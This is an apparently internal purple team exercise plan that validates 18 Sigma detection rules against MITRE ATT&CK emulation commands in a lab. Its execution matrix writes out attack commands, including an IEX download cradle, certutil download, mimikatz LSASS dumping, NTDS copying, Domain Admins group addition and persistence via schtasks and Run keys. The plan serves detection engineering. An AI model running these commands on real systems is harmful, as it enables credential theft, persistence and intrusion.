# Cyberion Defense Labs — Purple Team Exercise Plan
**Document ID:** CDL-PURPLE-01  
**Classification:** Internal Use — Engineering Program (CDL-DET-V2 Advanced Deliverable)  
**Author:** Detection Engineering & Red Team Operations Practice  
**Date:** 2026-10-08  
**Scope:** Validation of 18 Production Sigma Detection Rules Across 9 MITRE ATT&CK Tactics  

---

## 1. Executive Summary & Exercise Objectives

Purple Teaming represents the collaborative pairing of offensive adversary emulation (Red Cell) with defensive detection engineering and security monitoring (Blue Cell), moderated by an impartial exercise coordinator (White Cell). 

The primary objectives of the **Cyberion Purple Team Exercise** are:
1. **Empirical Validation:** Rigorously validate all 18 production Sigma detection rules against real, controlled adversary emulation commands in an instrumented lab environment.
2. **Telemetry Gap Identification:** Verify that endpoint mini-filters (Sysmon v15), Windows Audit Policies, and perimeter network sensors (Zeek) record expected forensic artifacts.
3. **Detection Tuning:** Identify alert latency, evaluate false-positive triggers, and refine rule conditions in real time.
4. **Quantified Defensibility:** Establish an audit-defensible baseline of verified detection coverage mapped directly to MITRE ATT&CK techniques.

---

## 2. Rules of Engagement & Exercise Parameters

```
+--------------------------------------------------------------------------------------------------+
|                                    PURPLE TEAM EXERCISE ARCHITECTURE                             |
+--------------------------------------------------------------------------------------------------+
|                                                                                                  |
|   [ RED CELL: Adversary Emulation ]                                                              |
|        ├── Executes Atomic Red Team & Custom Offensive Procedures                                |
|        └── Logs exact execution timestamps, PIDs, and command lines                             |
|                           │                                                                      |
|                           ▼                                                                      |
|   [ TARGET ENVIRONMENT: Instrumented Member Servers & Workstations ]                             |
|        ├── Windows Server 2022 (Domain Controller: DC-01)                                        |
|        ├── Windows 11 Enterprise (Workstations: WKSTN-FIN-01, WS-MKTG-02)                        |
|        └── Network Tap: Zeek Protocol Sniffer v6.0 on Corporate Gateway                          |
|                           │                                                                      |
|                           ▼                                                                      |
|   [ BLUE CELL: Detection & Monitoring ]                                                          |
|        ├── Evaluates incoming Sysmon, Win Security, and Zeek logs                                |
|        └── Observes rule hit rate, latency, and alert fidelity in SIEM                           |
|                           │                                                                      |
|                           ▼                                                                      |
|   [ WHITE CELL: Coordination & Scoring ]                                                         |
|        ├── Scores each test (Pass / Partial / Fail)                                              |
|        └── Coordinates immediate on-the-fly rule tuning if blind spots are found                 |
+--------------------------------------------------------------------------------------------------+
```

### 2.1 Environmental Boundaries
- **Lab Subnet:** `192.168.10.0/24` (Workstations) and `192.168.20.0/24` (Domain Infrastructure).
- **Target Hosts:**
  - `DC-01.cyberion.local` (`192.168.20.10`): Primary Domain Controller.
  - `FS-CORP-01.cyberion.local` (`192.168.20.15`): Member File Server.
  - `WKSTN-FIN-01.cyberion.local` (`192.168.10.115`): Instrumented Finance Workstation.
- **Safety Safeguards:**
  - All test commands are scoped to benign payloads (e.g. executing `whoami` or calling localhost endpoints).
  - No irreversible destructive actions (no real credential deletion, no persistent rootkits).
  - Every procedure has an automated cleanup script.

---

## 3. Master Purple Team Execution Matrix (18 Detections Paired)

| Test ID | ATT&CK ID & Name | Red Cell Emulation Procedure (Atomic Test Syntax) | Expected Telemetry Source | Blue Cell Sigma Rule | Pass / Fail Criteria |
|:---:|:---|:---|:---|:---|:---|
| **PT-01** | `T1059.001` PowerShell | `powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/test.ps1')"` | Sysmon Event 1 / Win 4688 | `CDL-RULE-001` | **Pass:** Alert fires within 30s citing target URL and IEX cradle. |
| **PT-02** | `T1003.001` LSASS Dump | Execute mimikatz `sekurlsa::logonpasswords` or `procdump -ma lsass.exe out.dmp` | Sysmon Event 10 (ProcessAccess) | `CDL-RULE-002` | **Pass:** Event 10 generated with GrantedAccess `0x1010` on `lsass.exe`. |
| **PT-03** | `T1569.002` PsExec | `psexec.exe \\192.168.20.10 -accepteula cmd.exe /c hostname` | Sysmon Event 1 / Win System 7045 | `CDL-RULE-003` | **Pass:** PSEXESVC execution captured under `services.exe`. |
| **PT-04** | `T1047` WMI Process | `wmic.exe process call create "cmd.exe /c whoami"` | Sysmon Event 1 (Parent: wmiprvse.exe) | `CDL-RULE-004` | **Pass:** Child `cmd.exe` identified originating from WMI provider. |
| **PT-05** | `T1071.001` C2 HTTP | Outbound HTTP curl request to external port 8443 with Cobalt user agent | Zeek `http.log` / `conn.log` | `CDL-RULE-005` | **Pass:** Zeek alert triggers on port 8443 with anomalous User-Agent. |
| **PT-06** | `T1003.003` NTDS Copy | `vssadmin create shadow /for=C:` followed by copy of `ntds.dit` | Sysmon Event 1 / Win 4688 | `CDL-RULE-006` | **Pass:** Execution of `vssadmin` or `ntdsutil` shadow copy flagged. |
| **PT-07** | `T1098` AD Group Add | `net group "Domain Admins" testuser /add /domain` | Windows Security Event 4728 / 4732 | `CDL-RULE-007` | **Pass:** Event 4728 surfaces user addition to privileged group. |
| **PT-08** | `T1218.011` Rundll32 | `rundll32.exe C:\Users\Public\test.dll,#1` | Sysmon Event 1 / Win 4688 | `CDL-RULE-008` | **Pass:** Rundll32 executing from user-writable path flagged. |
| **PT-09** | `T1053.005` Schtasks | `schtasks /create /tn "TestPersistence" /tr "powershell.exe -c whoami" /sc daily /ru SYSTEM` | Sysmon Event 1 / Win 4698 | `CDL-RULE-009` | **Pass:** Schtasks creating elevated script task detected. |
| **PT-10** | `T1547.001` Reg Run Key | `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Test" /d "C:\Users\Public\app.exe" /f` | Sysmon Event 13 (RegistryEvent) | `CDL-RULE-010` | **Pass:** Event 13 records value modification in Run key. |
| **PT-11** | `T1071.004` DNS Tunnel | `nslookup -type=TXT aW5maWw=.stage01.tunnel.test.com 127.0.0.1` | Zeek `dns.log` / Sysmon Event 22 | `CDL-RULE-011` | **Pass:** Query for TXT tunneling domain detected. |
| **PT-12** | `T1105` Certutil LOLBAS | `certutil.exe -urlcache -split -f http://127.0.0.1/test.bin C:\Users\Public\test.bin` | Sysmon Event 1 / Win 4688 | `CDL-RULE-012` | **Pass:** Certutil command line with `-urlcache -split -f` flagged. |
| **PT-13** | `T1218.005` Mshta | `mshta.exe vbscript:Execute("MsgBox(""Test""):close")` | Sysmon Event 1 / Win 4688 | `CDL-RULE-013` | **Pass:** Mshta executing inline VBScript protocol intercepted. |
| **PT-14** | `T1021.001` Netsh Tunnel| `netsh interface portproxy add v4tov4 listenport=8080 connectport=3389 connectaddress=127.0.0.1` | Sysmon Event 1 / Win 4688 | `CDL-RULE-014` | **Pass:** Netsh configuring port forwarding to 3389 alerted. |
| **PT-15** | `T1558.003` Kerberoast | Request TGS ticket with encryption 0x17 using Rubeus or PowerShell Kerberoast | Windows Security Event 4769 | `CDL-RULE-015` | **Pass:** Event 4769 with TicketEncryptionType `0x17` flagged. |
| **PT-16** | `T1110 -> T1078` Spray | Execute 5 failed logons via NTLM followed by 1 successful logon from same source IP | Windows Security 4625 -> 4624 | `CDL-RULE-016` | **Pass:** Correlation rule aggregates sequence within 5m window. |
| **PT-17** | `T1087 -> T1021` Recon | Execute `net group "Domain Admins" /domain` followed within 5m by `wmic process call create` | Sysmon Event 1 Sequence | `CDL-RULE-017` | **Pass:** Multi-event correlation links recon to lateral execution. |
| **PT-18** | `T1003 -> T1071` Exfil | Execute memory access on `lsass.exe` followed within 2m by socket connect to external port 8443 | Sysmon Event 10 -> Event 3 | `CDL-RULE-018` | **Pass:** Cross-sensor correlation links LSASS access to egress socket. |

---

## 4. Scoring Criteria & Post-Exercise Feedback Loop

Each test case is evaluated on a 3-tier scoring framework:
1. **Pass (100%):** Telemetry recorded with full command line and context; Sigma rule triggered accurately without false-positive suppression; Mean-Time-to-Detect (MTTD) $< 60$ seconds.
2. **Partial (50%):** Telemetry logged in raw sensors, but detection rule required manual modification or alert generated after $> 3$ minutes.
3. **Fail (0%):** Technique executed cleanly without corresponding telemetry or alert generated.

### Remediation Protocol
- If any test scores **Partial** or **Fail**, the White Cell issues an immediate 1-hour engineering hold.
- The Red Cell provides exact process IDs and execution timestamps.
- The Blue Cell reviews sensor filters, updates the Sigma rule logic, re-runs the automated harness (`python tools/harness.py`), and the Red Cell re-executes the test until a **Pass** is achieved.

---
*Signed and Approved by:*  
**Detection Engineering & Red Team Lead — Cyberion Defense Labs**
